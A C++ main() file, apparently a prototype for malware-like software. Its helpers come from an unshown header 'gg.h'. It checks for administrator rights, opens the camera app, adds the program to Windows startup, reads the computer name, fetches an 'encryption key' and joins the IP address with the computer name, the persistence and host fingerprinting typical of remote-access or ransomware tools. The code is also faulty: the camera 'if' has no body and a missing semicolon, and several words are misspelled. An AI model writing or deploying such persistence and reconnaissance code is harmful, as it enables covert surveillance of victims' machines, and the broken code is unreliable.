#include "gg.h"

int main(int argc, char* argv[])
{
    // Initialize COM
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
    {
        std::cerr << "Failed to initialize COM library." << std::endl;
        return 1;
    }

    // Check for administrative privileges
    bool isAdmin = IsAdministrator(hr);

    if (SUCCEEDED(hr))
    {
        if (isAdmin)
        {
            std::cout << "The program is running with administrative privileges." << std::endl;
        }
        else
        {
            std::cout << "The program is NOT running with administrative privileges." << std::endl;
        }
    }
    else
    {
        std::cerr << "Failed to determine administrative privileges. Error code: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    std::cin.get(); // Wait for user input to continue

    // Prompt the user for the path to add to startup
    std::string path = get_this_file_path();
	if (path.empty())
    {
		std::cerr << "Failed to get the path to the program." << std::endl;
		return 1;
	}

	std::cout << "File path: " << path << std::endl;
	std::cout << "Press any key to continue..." << std::endl;

    // open camere
	if (open_camera_app() ? std::cout << "Camera app opened successfully." : std::cerr << "Failed to open camera")

	std::cin.get(); // Wait for user input to continue
    

    if (add_to_startup(path))
    {
        std::cout << "Program successfully added to startup." << std::endl;
    }
    else
    {
        std::cerr << "Failed to add the program to startup." << std::endl;
    }

	std::cout << "comoputer name: " << fetch_computer_name() << std::endl;
	std::cin.get(); // Wait for user input to continue

    int key = get_encryption_key();
	std::cout << "Encryption key: " << key << std::endl;
	std::cout << conccet_ip_and_computer_name(key) << std::endl;
	std::cin.get(); // Wait for user input to continue

    return 0; // Exit with success
}



